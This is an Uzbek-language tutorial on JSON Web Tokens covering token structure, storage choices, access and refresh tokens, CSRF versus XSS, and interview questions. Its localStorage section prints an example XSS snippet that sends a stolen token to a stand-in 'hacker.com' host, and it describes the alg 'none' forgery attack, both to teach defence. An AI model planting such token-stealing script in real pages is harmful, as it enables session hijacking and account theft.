# JWT (JSON Web Tokens)

## Kirish

> [!IMPORTANT]
> **Nima uchun muhim?**  
> HTTP protokoli tabiatan o'ziga xos xotirasiz (stateless) dir. Siz login qilganingizdan keyin "Mening sahifam" ga o'tsangiz, server sizni kimligingizni bilmaydi. Ilgari buning uchun Session ishlatilardi, lekin mikroservislar ko'paygani sari serverning o'zida har bir odamni saqlab turish (Session) qiyinlashib ketdi. Bunga yechim sifatida JWT keldi — server sizni tanib olishi uchun o'ziga narsalarni emas, shunchaki qo'lingizga muhrlangan bilet (Token) tutqazib yuboradi.

> [!NOTE]
> **Real-hayot analogiyasi: "Klubga kirish (Session vs JWT)"**  
> - **Session (Klubdagi Ro'yxat):** Siz klubga bordingiz, qorovul passportingizni tekshirdi (Login) va ismingizni "Ichkaridagi mehmonlar ro'yxati" ga yozib qo'ydi. Siz har safar barga borsangiz ofitsiant borib qorovulning ro'yxatida bormisiz yo'qmi tekshirib kelishi kerak bo'ladi (Server Database). Odam ko'paysa ro'yxat katta bo'lib ketadi va tekshirish sekinlashadi.
> - **JWT (VIP Braslet):** Siz klubga bordingiz, qorovul passportni ko'rib sizning qo'lingizga yechilmaydigan, gologrammali "VIP Braslet" (JWT) taqib qo'ydi. Endi istalgan bar yoki xonaga kirsangiz, ular shunchaki brasletga qarab sizni VIP ekaningizni bilishadi (Verify). Hech kim bazaga borib ro'yxat qidirmaydi (Stateless). Ammo, kimdir brasletingizni kesib olib o'ziga taqsa... muammo mana shunda!

JWT (JSON Web Token) - bu ikki tomon o'rtasida ma'lumotlarni xavfsiz JSON obyekti sifatida uzatish uchun ochiq standart (RFC 7519). Bu ma'lumotlar raqamli imzolanganligi sababli ularni tekshirish va ishonish mumkin.

---

## 🟢 Junior (Asoslar va Tushunchalar)

### JWT qanday ishlaydi?
Foydalanuvchi tizimga (Login) kirganda, uning logini va paroli to'g'ri bo'lsa server unga maxsus bilet - JWT yasab beradi. Endi foydalanuvchi "Mening sahifam" ni yoki biror yopiq ma'lumotni ko'rmoqchi bo'lsa, shu JWT ni so'rovlarga qo'shib (odatda `Authorization` headerida) jo'natishi kerak. Server uni tekshiradi va ruxsat beradi.

### Token tarkibi qanday bo'ladi?
JWT 3 qismdan iborat bo'lib, ular `.` (nuqta) bilan ajratiladi: `Header.Payload.Signature`

**1. Header (Bosh qism):** Qanday usul bilan shifrlanganini bildiradi (Masalan: HS256).
**2. Payload (Yurak qismi):** Bu qismda foydalanuvchining ID si, ismi va qachon yaroqsiz bo'lishi (`exp` vaqti) yozilgan bo'ladi.
**3. Signature (Muhr):** Header va Payload ni xavfsiz ushlab turish uchun Backend o'zining "Secret" maxfiy so'zi bilan urgangan raqamli imzosi. Busiz tokenni soxtalashtirib bo'lmaydi.

### Kodda ishlatilishi:
```javascript
// Odatda JWT frontendda shunday so'rovlarga ulanadi
fetch('https://api.saytim.uz/users', {
  headers: {
    // Bearer so'zini unutmang!
    'Authorization': `Bearer eyJhbGciOiJIUzI1...` 
  }
})
```

---

## 🟡 Middle (Amaliyot va Detallar)

### Nega JWT ni localStorage da saqlamaslik kerak?
Deyarli barcha boshlovchilar JWT kelishi bilan uni darhol brauzerdagi `localStorage` ga saqlab qo'yishadi. Bu juda KATTA xavf (XSS xavfi) tug'diradi!
Agar saytingizda biror joydan (masalan, kommentlar orqali) zararli JavaScript kodi kirib qolsa, u hujumchi (Hacker) kodiga aylanadi. Hacker oddiygina qilib sizning localStorage ingizdan Tokenni sug'urib oladi:
```javascript
// Hacker sizning saytingizga shu kodni tiqib qo'yishi mumkin:
const token = localStorage.getItem('token');
// Va uni o'zining yovuz serveriga jo'natib yuboradi:
fetch(`https://hacker.com/steal?token=${token}`);
```
Endi Hacker huddi VIP brasletni taqib olgan odam kabi, Backendga borib o'zini siz deb tanishtiradi va pullaringizni yechib oladi.

**Yechim:** JWT larni **HttpOnly Secure Cookie** larida saqlash eng zo'r yechimdir. Bunday Cookielarni JavaScript (`document.cookie`) o'qiy olmaydi. XSS hujumi uni o'g'irlay olmaydi.

### Access Token va Refresh Token
JWT ning bir marta qo'ldan chiqib o'g'irlanishi dahshatli narsa bo'lgani uchun, odatda 2 ta token qilinadi:
1. **Access Token:** Asosiy JWT. Uning ishlash vaqti juda qisqa bo'ladi (Masalan 15 minut). Xatto kimgadir qo'lga tushsa ham 15 minutda o'lib (expire) qoladi.
2. **Refresh Token:** Uzoq muddat (masalan, 30 kun) yashaydi. Backendga har 15 minutda borib "Mening access tokenim o'lib qoldi, mana senga Refresh tokenim, menga yangi Access token yasab ber" deydi. Bu to'liq avtomatlashtirilgan fondagi jarayondir.

---

## 🔴 Senior (Arxitektura va Optimizatsiya)

### CSRF vs XSS kurashi
Biz "Tokenni HttpOnly Cookie ga saqlashimiz kerak" dedik. Bu bizni XSS hujumidan to'liq himoya qildi (Chunki JS Cookieni o'qiyolmaydi).
Biroq, endi bizda yangi bosh og'rig'i — **CSRF (Cross-Site Request Forgery)** paydo bo'ldi. CSRF hujumida Hacker foydalanuvchiga yolg'on sayt ssilkasini tashlaydi. U yerda birorta ko'rinmas forma bo'lib, avtomat tarzda sizning saytingizga (masalan `/api/delete-user` ga) request yuboradi. Va eng yomoni — Brauzer **doim barcha Cookielarni har qanday requestda o'zi bilan olib ketgani uchun**, Hacker sizning nomingizdan parolni bilmasdan turib ish qilib qo'yadi.

**Yechimlar arxitekturasi:**
Shu muammoning eng muqobil (Oltin O'rtaliq) yechimi quyidagicha:
- `Refresh Token` ni Backend faqat **HttpOnly Cookie** ga yozsin.
- `Access Token` ni Backend to'g'ridan to'g'ri (JSON response) bersin.
- Frontend kelgan `Access Token` ni hech qanaqa storage ga yozmasdan, shunchaki JS ning bir o'zgaruvchisiga (VueX/Pinia, React State) yozib qo'ysin (Memory storage). Shunda u XSS dan butkul himoyalanadi.
- Vaqt o'tishi bilan sahifa yangilansa state yo'qoladi, ammo bu payt Frontend backendning maxsus `/refresh` endpointiga murojaat qilsa, brauzer o'sha maxsus HttpOnly dagi Refresh Token ni jo'natadi va Frontend orqaga yana zo'p-zangi Access Token oladi!

### Intervyu Savollari (Qiyin daraja)
**1. JWT ni qanday qilib backenddan majburan bekor (Revoke) qilib bo'lmaydi deyishadi, nega shunday? Yechimi bormi?**
*Javob:* JWT o'z tabiati bilan stateless (Mustaqil) bo'lgani uchun Backend JWT ni yaratib berganidan keyin uning nazoratini yo'qotadi (Vip braslet berganday). Shuning uchun agar Token muddati (exp) tugamagunicha uni qora ro'yxatga (Revoke/Blacklist) qo'shish qiyin, chunki backend ro'yxatni saqlab o'tirishi (Session ga aylanishi) kerak bo'lib qoladi. Yechim sifatida: qisqa yashovchi (15 minut) Access Token qilinadi va uni umuman revoke qilinmaydi, faqatgina Refresh tokenni bazaga qora ro'yxat qilib yozib qo'yiladi.

**2. Agar kimdir bizning JWT ni Base64 qilib decode qilib o'qib olsa u xavflimi?**
*Javob:* JWT - bu Shifrlangan (Encrypted) ma'lumot emas! U shunchaki Base64 (Encoding) qilingan narsa xolos. JWT.io saytiga kirib istalgan tokenning o'rtasidagi ma'lumotni o'qib olish mumkin. Shuning uchun Token Payload qismiga parol, kredit karta raqamlari yoki ortiqcha o'ta maxfiy narsalar qo'shib yuborish o'ta katta xatodir. Odatda faqat User ID va qachon yaroqsiz bo'lish vaqti (exp) yoziladi xolos.

**3. Token Signature qismida qanday zaiflik bo'lishi mumkin (Algorithm Confusion Attack)?**
*Javob:* Backend tokenni tekshirganda undagi Headerning `alg` bo'limiga ishonib qolishi katta xavf. Masalan u yerda `HS256` yozilgan bo'lishi kerak. Hujumchi shu so'zni `none` (Algoritm yo'q) so'ziga almashtirib va uchinchi qism (Signature) ni umuman o'chirib, backendga yuborishi mumkin. Noto'g'ri yozilgan kod (Odatda zaif JWT kutubxonalari) "Aha algoritm none ekan, demak imzosi shart emas" deb ochiq xatoni qabul qilishi mumkin. Yaxshi kodda doim `jwt.verify(token, secret, { algorithms: ['HS256'] })` deb algoritm qat'iy tekshiriladi.

---

## Eng Yaxshi Amaliyotlar (Best Practices)

1. **Payload ni sir saqlamang:** JWT bu shifr (encryption) qilingan ma'lumot emas, balki shunchaki Base64 da olingan tekst. Barcha (Hatto hujumchi ham) uning ichini o'qiy oladi. Shuning uchun token ichiga parol, kredit karta kabi ma'lumotlarni ASLO yozmang.
2. **Access/Refresh Token ajrating:** Access token 15-30 daqiqa yashaydigan (short-lived) qilib ishlating va xavfsiz bo'lishi uchun faqat memory'da ushlang. Uni yangilab beruvchi Refresh Token ni uzoq vaqt yashaydigan (long-lived) qilib, brauzerdagi HTTPOnly Secure Cookie da saqlang.
3. **Secret Key (Maxfiy so'z):** Serverda tokenlarni tasdiqlovchi "Secret Key" uzun va xavfsiz (masalan, UUID yoki 256-bitli string) bo'lishi kerak. Github ga uni qo'shib yuborishdan judayam ehtiyot bo'ling.
4. **Chiqish (Logout):** Backend da logout ni qilish JWT da imkonsiz, shuning uchun Frontend tomonidan JWT ni o'chirib yuborish eng zo'r yechimdir.

---

## Xulosa

| Tushuncha | Ta'rifi | Asosiy Vazifasi |
|-----------|---------|-----------------|
| **Header** | Token formati va shifrlash algoritmi | Qanday o'qishni va tekshirishni bildiradi |
| **Payload** | Haqiqiy foydali ma'lumotlar | User ID, email va ruxsatlarni o'z ichiga oladi |
| **Signature**| Maxfiy so'z bilan tasdiqlash | Ma'lumotlarni o'zgarmaganini tekshiradi |
| **State** | Server xotirasi (Session) | JWT stateless, serverda xotira talab qilmaydi |

JWT - zamonaviy web ilovalar, ayniqsa microservices arxitekturasi uchun ajoyib yechim. Ammo uni xavfsiz saqlash va Refresh Token mexanizmi bilan ishlash muhim. XSS hujumlariga qarshi local storage ishlatishdan qoching!
